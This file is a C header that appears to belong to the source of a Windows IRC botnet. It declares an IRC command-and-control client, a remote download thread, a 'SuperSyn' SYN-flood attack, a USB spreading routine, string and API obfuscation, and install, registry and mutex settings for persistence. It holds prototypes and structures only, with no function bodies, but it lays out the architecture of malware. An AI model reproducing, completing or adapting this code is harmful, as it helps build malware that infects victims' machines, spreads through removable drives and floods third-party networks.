#define WIN32_LEAN_AND_MEAN

#define MAX_LINE				512
#define MAX_RECEIVE_BUFFER		2048
#define MAX_WORDS				64
#define MAX_THREADS				256
#define THREAD_WAIT_TIME        1024

#pragma comment(linker, "/FILEALIGN:200")

#include <windows.h>
#include <winsock2.h>
#include <tchar.h>
#include <stdio.h>
#include <shlwapi.h>

#include "apis.h"

#ifndef OTHERSTRINGS
//#include "strings_other.h"
#endif

typedef enum
{
    MSG_PASS,
    MSG_NICK,
    MSG_USER,
    MSG_PONG,
    MSG_JOIN,
    MSG_PART,
    MSG_PRIVMSG,
    MSG_QUIT
} my_messages;

typedef enum
{
    NONE,
    T_WGET,
    T_HIDER,
    T_USB,
    T_SSYN,
    T_New
} thread_type;

typedef struct
{
    HANDLE		tHandle;
    thread_type type;
    SOCKET		tsock;
    int         tnum;
} thread_s;

typedef struct
{
    unsigned long	ip;
    char			ip_char[16];
    char			myip[16];
    unsigned short	port;
    SOCKET			omgsockz;
    char			channel[128];
} exparam_s;

typedef struct
{
    char	url[256];
    char	destination[MAX_PATH];
    char	channel[128];
    int		mode;
    SOCKET	ircsock;
    int		tnum;
} download_s;

typedef struct
{
    char *host;
    unsigned short port;
    char *password;
} my_;

extern char config_pass[], chan[], chanpass[], authost[], prefix[];
extern char installpath[], exename[], regname[], servicedesc[], mutex[];
extern char my_userprofile[], autorun[], regkey_location[];
extern char statspanel[];

extern thread_s		threads[MAX_THREADS];
extern int          omgsockz;
int threadnum;
char *my_nicktype(void);
extern HANDLE ih;
void Startup();

/* THREADS */
HANDLE Thread_Start(LPTHREAD_START_ROUTINE function, LPVOID param, BOOL wait);
void Thread_Clear(int num);
int Thread_Add(thread_type type);
void Thread_Prepare();
int Thread_Check(thread_type type);
int Thread_Kill(thread_type type);

/* IRC */
DWORD WINAPI Node_Thread(LPVOID param);
int Node_Send(SOCKET sock, my_messages msg, char *buffer, char *to);
int Node_Connect(char *host, unsigned short port);

/* PROTECTION */
DWORD WINAPI CreateWin(HINSTANCE hInstance);

/* WGET */
DWORD WINAPI Wget_Thread(LPVOID param);

/* ENCRYPTION */
char* Reverse_Str(char* str);
void decode_things(void);
void decode_apis(void);
void load_Xor(void);

/* SPREADER - USB+ */
void spread_external();

/* SUPERSYN */
typedef struct SUPERSYN
{

    SOCKET sock;
    char ip[128];
    char port[128];
    char length[128];
    char chan[128];
    int threadnum;
    BOOL notice;
    BOOL silent;
    BOOL gotinfo;

} SUPERSYN;

DWORD WINAPI SuperSynThread(LPVOID param);
long SuperSynSend(unsigned long TargetIP, unsigned short TargetPort,int Times);
long SuperSyn(char *target, char *port, char *len);

/* OTHER */
void wait_(void);
void KillBadGuys();
